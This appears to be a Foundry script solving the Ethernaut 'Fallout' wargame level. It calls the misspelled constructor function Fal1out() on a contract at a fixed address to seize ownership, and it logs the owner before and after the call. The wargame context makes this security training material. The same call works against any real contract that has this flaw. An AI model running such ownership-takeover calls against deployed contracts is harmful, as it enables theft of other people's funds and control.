// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../instances/Ilevel02.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Fallout level02 =
        Fallout(payable(0xa74a460BE4dF95CBB032a49795d00Efc692fa5D3));

    function test() external {
        vm.startBroadcast();

        console.log("Initial owner is: ", level02.owner());
        level02.Fal1out();
        console.log("New owner is: ", level02.owner());

        vm.stopBroadcast();
    }
}
